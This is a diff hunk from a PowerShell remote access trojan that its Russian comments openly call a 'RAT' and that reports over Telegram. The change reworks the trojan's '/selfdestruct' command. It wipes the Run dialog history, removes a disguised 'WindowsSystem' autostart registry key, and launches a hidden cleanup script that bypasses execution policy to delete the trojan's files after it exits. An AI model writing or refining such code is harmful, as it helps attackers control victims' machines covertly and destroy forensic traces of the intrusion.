@@ -214,21 +214,26 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
+                            # Отправляем сообщение перед уничтожением
+                            Send-Telegram "RAT самоуничтожается. Все следы удаляются."
+                            
                             # Очистка истории RUN
                             Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                             
                             # Удаление из автозагрузки
                             Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction SilentlyContinue
                             
-                            # Удаление файлов
-                            if (Test-Path $scriptPath) { 
-                                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue 
-                            }
-                            if (Test-Path $MyInvocation.MyCommand.Path) { 
-                                Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue 
-                            }
+                            # Создаем скрипт для удаления файлов после завершения работы
+                            $cleanupScript = @"
+Start-Sleep -Seconds 3
+Remove-Item "$scriptPath" -Force -ErrorAction SilentlyContinue
+Remove-Item "$($MyInvocation.MyCommand.Path)" -Force -ErrorAction SilentlyContinue
+"@
+                            $cleanupPath = "$env:TEMP\cleanup.ps1"
+                            $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                             
-                            Send-Telegram "RAT самоуничтожен. Все следы удалены."
+                            # Запускаем скрипт очистки и завершаем работу
+                            Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -Wait:$false
                             exit
                         }
                     }
